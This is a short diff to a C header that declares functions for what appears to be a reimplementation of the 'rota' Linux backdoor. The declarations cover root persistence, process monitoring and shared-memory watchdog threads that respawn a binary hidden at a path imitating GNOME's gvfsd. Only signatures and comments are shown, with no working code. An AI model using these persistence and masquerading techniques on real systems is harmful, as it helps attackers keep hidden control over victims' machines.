@@ -50,10 +50,10 @@ bool root_persistence(void);
 /**
 *
 * @brief monitor /proc/<PID> for existence of a given process.
-* @param pid, integer value corresponding to a given process.
+* @param pid, pointer to integer value corresponding to a given process.
 * @return boolean value indicating file in proc exists or not.
 **/
-bool monitor_proc(char *pid);
+bool monitor_proc(int *pid);
 
 /**
  * @brief helper function to write data to disk
@@ -71,7 +71,7 @@ bool write_to_file(char *fpath, char *data);
  * @param char pointer to file path to exec (rota binary)
  * @return N/A
  * */
-void *watchdog_process_shmget(void *fpath);
+void *watchdog_process_shmget();
 
 
 /**
@@ -79,7 +79,7 @@ void *watchdog_process_shmget(void *fpath);
  *@param fpath char pointer to file path to exec (rota binary)
  *@return N/A
  * */
-void *watchdog_process_shmread(void *fpath);
+void *watchdog_process_shmread();
 
 /**
  * @brief spawn a thread for persistence IPC watchdog processes
@@ -87,7 +87,7 @@ void *watchdog_process_shmread(void *fpath);
  * @param fpath file path to rota  (~/.gvfsd/.prolfile/gvfsd-helper)
  * @return N/A
  **/
-void spawn_thread_watchdog(int some_id, char *fpath);
+void spawn_thread_watchdog(int some_id);
 
 
 /**
